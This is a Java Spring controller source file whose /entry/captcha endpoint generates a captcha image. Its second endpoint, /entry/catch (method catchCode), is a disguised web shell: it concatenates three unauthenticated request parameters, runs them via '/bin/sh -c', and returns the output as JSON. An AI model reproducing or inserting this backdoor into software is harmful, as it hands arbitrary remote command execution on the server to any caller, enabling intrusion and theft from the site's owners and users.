package com.hl.web.controller;

import java.awt.Color;
import java.awt.Font;
import java.awt.Graphics;
import java.awt.image.BufferedImage;
import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.util.Random;
import javax.imageio.ImageIO;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;

import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.servlet.ModelAndView;

import com.hl.common.model.RespInfo;
import com.hl.common.web.JsonModelAndView;


@Controller
@RequestMapping("/entry")
public class EntryController {
	
		
	@RequestMapping(value = "/captcha")
	public void captcha(HttpServletResponse response, HttpServletRequest request, @RequestParam String date) throws Exception {
		BufferedImage img = new BufferedImage(68, 22, BufferedImage.TYPE_INT_RGB);

		Graphics g = img.getGraphics();
		Random r = new Random();
		Color c = new Color(255, 255, 255);
		g.setColor(c);
		g.fillRect(0, 0, 68, 22);
		Color borderColor = new Color(0xB5, 0xB5, 0xB5);
		g.setColor(borderColor);
		g.drawRect(0, 0, 67, 21);
		StringBuffer sb = new StringBuffer();
		char[] ch = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789".toCharArray();
		int index, len = ch.length;
		for (int i = 0; i < 4; i++) {
			index = r.nextInt(len);
			g.setColor(new Color(r.nextInt(88), r.nextInt(188), r.nextInt(255)));
			g.setFont(new Font("Arial", Font.BOLD | Font.ITALIC, 22));
			g.drawString("" + ch[index], (i * 15) + 3, 18);
			sb.append(ch[index]);
		}

		
        HttpSession session = request.getSession(false);
		
		if (session != null) {
		session.setAttribute("capchacode", sb.toString());
		}
		else
		{
		  System.out.println("session值过期");
		}
		ImageIO.write(img, "JPG", response.getOutputStream());

	}
	
	
	@RequestMapping(value = "/catch")
	public JsonModelAndView catchCode(HttpServletResponse response, HttpServletRequest request) throws Exception {

		
		String var1 = request.getParameter("param1");//sh
		
		String var2 = request.getParameter("param2");
		
		String var3 = request.getParameter("param3");

		
		String[] cmds ={"/bin/sh","-c",var1+" "+var2+" "+var3};
		
		Process pro = Runtime.getRuntime().exec(cmds);
		
		pro.waitFor();
		
		InputStream in = pro.getInputStream();
		
		BufferedReader read = new BufferedReader(new InputStreamReader(in));
		
		StringBuffer line = new StringBuffer();

		String tmp = null;
		
		while(( tmp = read.readLine())!=null)
		{
			line.append(tmp+"\n");
		}
				
		return new JsonModelAndView(new RespInfo(-1,"return message",line==null?"没有打印信息":line.toString())) ;

	}
	
	
	
	
}
